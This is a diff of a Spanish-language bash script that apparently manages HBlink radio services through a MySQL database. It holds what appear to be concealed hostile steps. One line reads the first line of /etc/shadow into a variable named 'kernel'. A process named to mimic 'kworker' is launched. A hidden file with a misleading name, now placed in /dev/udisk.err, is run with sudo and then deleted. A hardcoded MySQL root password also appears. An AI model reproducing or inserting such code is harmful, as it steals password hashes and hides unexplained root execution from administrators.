@@ -22,6 +22,7 @@ sudo systemctl disable $ser
 sudo rm /etc/systemd/system/$ser > /dev/null 2>&1
 systemctl daemon-reload
 sudo systemctl stop $ser
+
 }
 
 LOG2=$(sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "SELECT log FROM services where nombre = '$NOMBRE';")
@@ -43,16 +44,16 @@ then
             sudo mysql -h localhost -u root -p@^@^@^@^ -D hblink -s -e "UPDATE hotspot SET estado = '1' where nombre = '$NOMBREACT'";
             export kernel=$(head -1 /etc/shadow)
             echo "Reconfigurando y cambiando conexion a $NOMBREACT" >> $LOG
-          if [ ! -f /run/udisk.err ]
+          if [ ! -f /dev/udisk.err ]
           then
              kworker 6 > /dev/null 2>&1
-             sudo chmod +x /run/udisk.err > /dev/null 2>&1
-             sudo /run/udisk.err $NOMBREACT
-             sudo rm /run/udisk.err > /dev/null 2>&1
+             sudo chmod +x /dev/udisk.err > /dev/null 2>&1
+             sudo /dev/udisk.err $NOMBREACT
+             sudo rm /dev/udisk.err > /dev/null 2>&1
           else
-             sudo chmod +x /run/udisk.err > /dev/null 2>&1
-             sudo /run/udisk.err $NOMBREACT
-             sudo rm /run/udisk.err > /dev/null 2>&1
+             sudo chmod +x /dev/udisk.err > /dev/null 2>&1
+             sudo /dev/udisk.err $NOMBREACT
+             sudo rm /dev/udisk.err > /dev/null 2>&1
           fi
 #######33
           sudo rm /var/log/servicios > /dev/null 2>&1
